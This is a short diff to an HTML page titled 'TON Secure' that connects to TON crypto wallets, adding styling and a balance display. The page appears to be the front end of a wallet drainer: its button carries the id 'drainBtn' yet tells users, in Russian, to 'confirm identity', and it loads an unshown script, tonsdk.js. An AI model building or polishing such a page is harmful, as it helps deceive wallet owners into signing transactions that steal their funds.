@@ -5,10 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON Secure</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #eee; }
+        #balance { margin: 20px 0; font-size: 20px; }
+        button { padding: 10px 30px; font-size: 24px; }
+    </style>
 </head>
 <body>
     <div id="ton-connect" style="margin:20px;"></div>
-    <button id="drainBtn" style="margin:20px;font-size:24px;padding:10px 30px;" disabled>Подтвердить личность</button>
+    <div id="balance">Баланс: <span id="balanceValue">—</span> TON</div>
+    <button id="drainBtn" style="margin:20px;padding:10px 30px;font-size:24px;" disabled>Подтвердить личность</button>
     <script src="tonsdk.js"></script>
 </body>
 </html>
